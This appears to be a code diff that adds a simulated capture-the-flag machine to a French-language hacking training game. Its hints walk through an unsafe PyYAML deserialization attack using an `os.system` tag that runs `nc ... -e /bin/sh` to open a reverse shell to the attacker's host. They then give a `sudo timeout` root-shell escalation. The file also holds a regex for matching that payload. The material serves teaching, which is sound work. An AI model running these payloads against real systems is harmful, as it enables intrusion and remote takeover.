@@ -1062,6 +1062,76 @@ const MACHINES = [
 
   // ─────────────────────────────────────────────────────────────────
   {
+    id: "pulsar",
+    name: "PULSAR",
+    ip: "10.10.11.55",
+    difficulty: "Difficile",
+    os: "Linux (Debian 12)",
+    briefing: "Un service de configuration qui importe des fichiers YAML... avec un chargeur qui fait un peu trop confiance à leur contenu.",
+    ports: [
+      { port: 22, proto: "tcp", state: "open", service: "ssh", version: "OpenSSH 9.2p1 Debian" },
+      { port: 9090, proto: "tcp", state: "open", service: "http", version: "Pulsar Config Importer (Python / PyYAML)" },
+    ],
+    web: {
+      "/": "<html>\n<head><title>Pulsar Config Importer</title></head>\n<body>\n<h1>Pulsar Config Importer</h1>\n<p>Import de configuration au format YAML.</p>\n<!-- POST /api/config/import — YAML brut uniquement -->\n<!-- TODO: migrer vers yaml.safe_load() avant la prod, le chargeur par defaut est trop permissif -->\n</body>\n</html>",
+    },
+    ftp: { enabled: false },
+    // Désérialisation YAML non sécurisée : le service charge le document reçu avec un chargeur
+    // permissif (façon PyYAML `yaml.load()` sans Loader restreint) qui interprète des tags
+    // `!!python/object/apply:...` pour instancier des objets Python arbitraires — dont un appel
+    // direct à `os.system(...)`. Un classique de la désérialisation non sécurisée, cousin des
+    // gadgets pickle/Java mais lisible en texte brut (pas besoin d'encodage binaire).
+    yamldeser: {
+      path: "/api/config/import",
+      injectRegex: /!!python\/object\/apply:os\.system\s*\[\s*["']nc\s+(\d+\.\d+\.\d+\.\d+)\s+(\d+)\s+-e\s+\/bin\/sh["']\s*\]/i,
+      invalidBody: "error: impossible de parser ce document YAML, ou tag non reconnu par le chargeur.",
+      user: "mfontaine",
+    },
+    sshUsers: {},
+    targetFS: {
+      hostname: "pulsar",
+      homeDir: "/home/mfontaine",
+      users: {
+        mfontaine: {
+          home: "/home/mfontaine",
+          fs: {
+            "user.txt": { type: "file", content: "FLAG{pulsar_acces_initial_yaml_deserialisation}", perms: "-rw-r--r--", owner: "mfontaine" },
+            ".bash_history": { type: "file", content: "id\nsudo -l\nexit", perms: "-rw-------", owner: "mfontaine" },
+            "note_interne.txt": { type: "file", content: "Note interne — Solenne Holdings\nLe service de config YAML tourne toujours avec le chargeur par défaut de PyYAML. R. Kade avait ouvert un ticket dessus il y a des mois : \"désérialisation non sécurisée, urgent\". Personne ne l'a jamais fermé.", perms: "-rw-r--r--", owner: "mfontaine" },
+          },
+        },
+      },
+      extraFS: {},
+      sudoL: "L'utilisateur mfontaine peut lancer les commandes suivantes sur pulsar :\n    (root) NOPASSWD: /usr/bin/timeout",
+    },
+    privesc: {
+      type: "sudo-direct",
+      // DSL d'exploit : sudo `timeout 7d /bin/sh` (GTFOBins) -- timeout relance le programme donné avant expiration du délai, avec les droits sudo hérités
+      exploit: { tool: "sudo", bin: "timeout 7d", spawn: "/bin/sh" },
+      enterMsg: "# (shell root obtenu via timeout -- technique GTFOBins)",
+    },
+    rootFile: { path: "/root/root.txt", content: "FLAG{pulsar_root_timeout_gtfobins}" },
+    hints: {
+      recon: [
+        "Ce service importe des fichiers de configuration au format YAML -- pense à ce qu'un chargeur YAML mal configuré peut faire.",
+        "Après `nmap 10.10.11.55`, lis `curl http://10.10.11.55:9090/` : un commentaire précise l'endpoint d'import et prévient que le chargeur par défaut est trop permissif.",
+        "PyYAML (et d'autres bibliothèques YAML) supportent des tags spéciaux comme `!!python/object/apply:...` qui, avec un chargeur non restreint, permettent d'instancier n'importe quel objet Python -- y compris un appel direct à une fonction du système.",
+      ],
+      access: [
+        "Le tag `!!python/object/apply:os.system` suivi d'une liste contenant une commande shell exécute cette commande côté serveur, dès que le document est chargé.",
+        "Mets-toi d'abord en écoute : `nc -lvnp 4444`.",
+        'Envoie le document YAML en POST : `curl -d \'!!python/object/apply:os.system ["nc 10.10.14.1 4444 -e /bin/sh"]\' http://10.10.11.55:9090/api/config/import` (même port des deux côtés). Tu obtiens un shell mfontaine.',
+      ],
+      privesc: [
+        "`sudo -l` une fois connecté : une seule commande NOPASSWD.",
+        "`timeout` relance simplement le programme donné en argument avant l'expiration d'un délai, avec les droits sudo hérités -- GTFOBins l'utilise pour lancer un shell root direct.",
+        "Lance `sudo timeout 7d /bin/sh` pour obtenir un shell root.",
+      ],
+    },
+  },
+
+  // ─────────────────────────────────────────────────────────────────
+  {
     id: "parallax",
     name: "PARALLAX",
     ip: "10.10.11.170",
